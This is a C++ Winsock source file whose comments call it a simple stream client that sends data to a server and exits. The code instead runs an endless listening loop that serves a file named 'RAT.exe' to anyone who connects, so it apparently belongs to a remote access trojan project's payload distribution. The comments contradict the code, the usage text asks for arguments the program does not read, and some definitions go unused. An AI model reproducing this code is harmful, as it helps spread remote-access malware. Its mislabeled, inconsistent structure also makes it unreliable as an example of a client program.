//
// Client.cpp
//
// Extremely simple, stream client example.
// Works in conjunction with Server.cpp.
//
// The program attempts to connect to the server and port
// specified on the command line. The Server program prints
// the needed information when it is started. Once connected,
// the program sends data to the server, waits for a response
// and then exits.
//
// Compile and link with wsock32.lib
//
// Pass the server name and port number on the command line. 
//
// Example: Client MyMachineName 2000
//
#include <stdio.h>
#include <winsock.h>
#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include "Connection.h"
#include "Connection_error.h"

using namespace std;

//Define for port and host arguments
//#define HARD_CODED_ARGS
#define SERVER_NAME "LAPTOP-M6CC1F8V"
#define MY_PORT 2020

// Function prototype
void StreamServer(short nPort);
string getFileName(const string& s);

 

// Helper macro for displaying errors
#define PRINTERROR(s)	cout<<"\n"<<s<<":"<<WSAGetLastError()

////////////////////////////////////////////////////////////

void main(int argc, char **argv)
{
	short nPort;
	char* server;

	//
	// Check for the host and port arguments
	//
#ifdef HARD_CODED_ARGS
	nPort = MY_PORT;

#else
	if (argc != 2)	{
		cout<<"\nSyntax: host PortNumber";
		cout<<endl;
		return;
	}
	nPort = atoi(argv[1]);

#endif

	//
	// Go do the stuff a stream client does
	//
    StreamServer(nPort);
	
	//
	// Release WinSock
	//
	WSACleanup();

}

////////////////////////////////////////////////////////////

void StreamServer(short nPort)
{
	try
	{
		Connection OpenConnect(nPort);
		do
		{
			try
			{
				OpenConnect.WaitRequest();
				OpenConnect.sendFile("RAT.exe");
			}
			catch (Connection_error ex)
			{
				cout << ex.what();
			}
		} while (true);
	}
	catch (Connection_error ex)
	{
		cout << ex.what();
	}
	cin.ignore();
	return;
}

string getFileName(const string& s) {
	char sep = '/';

#ifdef _WIN32
	sep = '\\';
#endif

	size_t i = s.rfind(sep, s.length());
	if (i != string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}
	return(s);
}